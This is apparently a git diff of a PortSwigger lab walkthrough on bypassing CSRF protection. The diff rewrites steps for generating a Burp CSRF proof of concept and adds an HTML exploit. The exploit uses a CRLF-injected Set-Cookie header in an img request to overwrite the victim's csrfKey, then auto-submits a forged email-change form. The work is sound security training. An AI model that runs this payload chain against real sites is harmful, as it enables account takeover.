@@ -237,58 +237,91 @@ As a result, the browser replaces its original `csrfKey` cookie with the attacke
 ![CRLF injection payload adding a malicious Set-Cookie header](lab-5-8.png)
 
 
-# Step 9 – Modify the Exploit
+# Step 9 – Generate the CSRF PoC
 
-Edit the generated HTML and add an `<img>` tag that triggers the CRLF injection before submitting the form.
+After confirming that the `csrfKey` cookie can be overwritten through the CRLF injection, return to the **email change request** where you previously replaced **Wiener's** `csrf` token and `csrfKey` with **Carlos's** values.
 
-The final exploit becomes:
+If the request method is currently **GET**, change it back to **POST** so that it matches the original email update request.
+
+The request should look similar to:
+
+```http
+POST /my-account/change-email HTTP/2
+
+Cookie:
+session=<Wiener's session>
+csrfKey=QMxY3Uh1ZDcFGGXoDdCRz57M2nWnW0UD
+
+email=attacker@gmail.com
+csrf=QSVOzZDt89HdFiuGvbRlQoUBQwXu5KTn
+```
+
+Now right-click the request in Burp Suite and select:
+
+```
+Engagement Tools → Generate CSRF PoC
+```
+
+Burp generates an HTML form containing the email change request along with Carlos's CSRF token.
+
+![Generating the CSRF PoC from the modified POST request](lab-5-9.png)
+
+
+# Step 10 – Modify the Generated CSRF PoC
+
+Burp Suite generates a basic CSRF Proof of Concept (PoC). Before using it, review the generated HTML and make the following changes.
+
+First, remove the automatically generated `<script>` block that submits the form. Instead, we'll use an image request to trigger the CRLF injection. When the image fails to load, the `onerror` event automatically submits the forged form after the victim's `csrfKey` cookie has been overwritten.
+
+### Generic Template
+
+Replace the script with the following template:
+
+```html
+<img src="https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR-KEY%3b%20SameSite=None"
+onerror="document.forms[0].submit()">
+```
+
+Replace:
+
+- `YOUR-LAB-ID` with your PortSwigger lab instance.
+- `YOUR-KEY` with the `csrfKey` value you want to inject into the victim's browser.
+
+---
+
+**Exploit Used in This Lab**
+
+For this lab, the modified PoC becomes:
 
 ```html
 <html>
 <body>
 
-<form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email" method="POST">
+<form action="https://0ac7002403cb9bcb80b9173a00500040.web-security-academy.net/my-account/change-email" method="POST">
     <input type="hidden" name="email" value="attacker@gmail.com">
     <input type="hidden" name="csrf" value="QSVOzZDt89HdFiuGvbRlQoUBQwXu5KTn">
     <input type="submit" value="Submit request">
 </form>
 
-<img src="https://YOUR-LAB-ID.web-security-academy.net/?search=testing%0d%0aSet-Cookie:%20csrfKey=QMxY3Uh1ZDcFGGXoDdCRz57M2nWnW0UD%3b%20SameSite=None"
+<img src="https://0ac7002403cb9bcb80b9173a00500040.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=QMxY3Uh1ZDcFGGXoDdCRz57M2nWnW0UD%3b%20SameSite=None"
 onerror="document.forms[0].submit()">
 
 </body>
 </html>
 ```
 
-### How it works
+> **Important:** Before storing or delivering the exploit, verify that the `csrf` token and the `csrfKey` cookie used in  the PoC are still valid. These values may expire over time.
 
-1. The browser loads the image.
-2. The request reaches the vulnerable search endpoint.
-3. The CRLF payload injects a new `Set-Cookie` header.
-4. The browser replaces the existing `csrfKey` cookie.
-5. The image fails to load.
-6. The `onerror` event automatically submits the forged form.
+If either value has expired:
 
-Since both the cookie and POST parameter now contain attacker-controlled values, the CSRF validation succeeds.
+1. Visit Carlos's **My Account** page again.
+2. Copy the new hidden `csrf` token from the email update form.
+3. Copy the updated `csrfKey` cookie from the request.
+4. Replace both values in the PoC with the new ones.
 
-![Final exploit HTML](lab-5-9.png)
+Once the PoC contains valid values, it is ready to be uploaded to the Exploit Server.
 
-
-# Step 10 – Upload the Exploit
-
-Open the **Exploit Server** provided with the lab.
-
-Paste the modified HTML into the body of the exploit page.
-
-Click:
-
-```
-Store
-```
-
-The exploit is now hosted by the exploit server.
-
-![Exploit uploaded to the exploit server](lab-5-10.png)
+![Modified CSRF PoC with the CRLF injection payload](lab-5-10.png)
 
 
 # Step 11 – Deliver the Exploit
